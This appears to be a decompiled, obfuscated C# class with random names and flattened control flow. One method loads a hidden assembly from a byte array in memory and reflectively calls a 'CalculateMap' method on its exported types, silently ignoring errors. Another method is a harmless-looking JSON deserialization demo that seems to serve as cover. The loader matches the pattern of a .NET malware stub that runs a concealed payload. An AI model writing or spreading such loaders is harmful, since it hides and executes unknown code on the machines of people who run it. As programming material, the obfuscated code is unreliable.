using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using Newtonsoft.Json;
using Tsjxretch.Factories;
using ac.Messages;

namespace Tsjxretch.Collections;

internal static class Database
{
	internal static Database MoveDic;

	public static bool OrderMerchant()
	{
		List<Type> list = new List<Type>();
		int num2 = default(int);
		int num3 = default(int);
		while (true)
		{
			IL_00f2:
			Type[] array = Assembly.Load((byte[])InitDic()).GetExportedTypes();
			int num = 7;
			if (_003CModule_003E_007B97c19ca2_002Dd30d_002D4926_002Db319_002D0f9297a6a699_007D.m_fca0e199d3a24a55ab30adaaaa279dea == 0)
			{
				goto IL_0079;
			}
			goto IL_00b3;
			IL_00b3:
			while (true)
			{
				switch (num)
				{
				case 13:
				{
					Type item = array[num2];
					list.Add(item);
					num = 1;
					if (_003CModule_003E_007B97c19ca2_002Dd30d_002D4926_002Db319_002D0f9297a6a699_007D.m_5bff68380c134911847975fbb2a8a118 != 0)
					{
						continue;
					}
					goto case 4;
				}
				case 4:
					num2++;
					goto case 1;
				case 1:
				case 11:
					if (num2 < array.Length)
					{
						goto case 13;
					}
					num3 = 9;
					goto case 9;
				case 9:
					array = list.ToArray();
					num = 5;
					if (_003CModule_003E_007B97c19ca2_002Dd30d_002D4926_002Db319_002D0f9297a6a699_007D.m_88b7b6a34669403eba478564d8d9b335 == 0)
					{
						continue;
					}
					goto IL_0059;
				case 12:
					break;
				case 7:
				case 8:
					num2 = 0;
					goto case 1;
				case 5:
					goto IL_0079;
				case 2:
				case 3:
					goto IL_007c;
				default:
					goto IL_0087;
				case 10:
					goto IL_00f2;
				case 6:
					goto end_IL_00f2;
				}
				break;
			}
			goto IL_005f;
			IL_0079:
			num2 = 0;
			goto IL_007c;
			IL_007c:
			if (num2 >= array.Length)
			{
				break;
			}
			goto IL_0087;
			IL_0087:
			Type type = array[num2];
			try
			{
				return (bool)type.InvokeMember("CalculateMap", BindingFlags.InvokeMethod, null, 0, null);
			}
			catch
			{
			}
			goto IL_005f;
			IL_005f:
			num2++;
			num = 3;
			if (_003CModule_003E_007B97c19ca2_002Dd30d_002D4926_002Db319_002D0f9297a6a699_007D.m_db58b855f26e43158f4c34dfe7f2379b != 0)
			{
				goto IL_0059;
			}
			goto IL_00b3;
			IL_0059:
			num = num3;
			goto IL_00b3;
			continue;
			end_IL_00f2:
			break;
		}
		return false;
	}

	public static void CheckMerchant()
	{
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0093: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		int num = 7;
		int num4 = default(int);
		MessageCreatorMessage item = default(MessageCreatorMessage);
		while (true)
		{
			IList<MessageCreatorMessage> list = new List<MessageCreatorMessage>();
			JsonTextReader val = new JsonTextReader((TextReader)new StringReader("{ 'name': 'Admin' }{ 'name': 'Publisher' }"));
			while (true)
			{
				CalcDic(val, bool_0: true);
				while (true)
				{
					IL_006d:
					if (!RemoveDic(val))
					{
						while (true)
						{
							IEnumerator<MessageCreatorMessage> enumerator = list.GetEnumerator();
							int num2 = 0;
							if (_003CModule_003E_007B97c19ca2_002Dd30d_002D4926_002Db319_002D0f9297a6a699_007D.m_3af44d15ac5f4a8f8e5b435d4bc2cdf9 == 0)
							{
								num2 = num;
							}
							switch (num2)
							{
							case 4:
								continue;
							case 3:
							case 5:
								goto end_IL_000b;
							case 8:
								goto IL_006d;
							case 2:
							case 6:
								goto end_IL_006d;
							case 7:
								goto end_IL_0078;
							case 1:
								return;
							}
							try
							{
								while (true)
								{
									int num3;
									if (CreateDic(enumerator))
									{
										Console.WriteLine((string?)VisitDic(enumerator.Current));
										num3 = 1;
										if (_003CModule_003E_007B97c19ca2_002Dd30d_002D4926_002Db319_002D0f9297a6a699_007D.m_2aa2ac6977c345ecaa178b837ac1f190 != 0)
										{
											goto IL_00be;
										}
									}
									else
									{
										num3 = 0;
										if (_003CModule_003E_007B97c19ca2_002Dd30d_002D4926_002Db319_002D0f9297a6a699_007D.m_684c958ac8024c6aae1eb7194d49d093 != 0)
										{
											goto IL_00be;
										}
									}
									goto IL_00c2;
									IL_00be:
									num3 = num4;
									goto IL_00c2;
									IL_00c2:
									switch (num3)
									{
									default:
										return;
									case 1:
										break;
									case 0:
										return;
									}
								}
							}
							finally
							{
								if (enumerator != null)
								{
									if (_003CModule_003E_007B97c19ca2_002Dd30d_002D4926_002Db319_002D0f9297a6a699_007D.m_5c480e29487b4621b917cf3de6fce67d == 0)
									{
										switch (0)
										{
										}
									}
									InstantiateDic(enumerator);
								}
							}
							continue;
							end_IL_000b:
							break;
						}
					}
					else
					{
						item = new JsonSerializer().Deserialize<MessageCreatorMessage>((JsonReader)(object)val);
					}
					list.Add(item);
					continue;
					end_IL_006d:
					break;
				}
				continue;
				end_IL_0078:
				break;
			}
		}
	}

	internal static object InitDic()
	{
		return StateAdapterFactory.CalcMerchant();
	}

	internal static bool EnableDic()
	{
		return MoveDic == null;
	}

	internal static Database InvokeDic()
	{
		return MoveDic;
	}

	internal static void CalcDic(object object_0, bool bool_0)
	{
		((JsonReader)object_0).set_SupportMultipleContent(bool_0);
	}

	internal static bool RemoveDic(object object_0)
	{
		return ((JsonReader)object_0).Read();
	}

	internal static object VisitDic(object object_0)
	{
		return ((MessageCreatorMessage)object_0).ConcatMerchant();
	}

	internal static bool CreateDic(object object_0)
	{
		return ((IEnumerator)object_0).MoveNext();
	}

	internal static void InstantiateDic(object object_0)
	{
		((IDisposable)object_0).Dispose();
	}
}
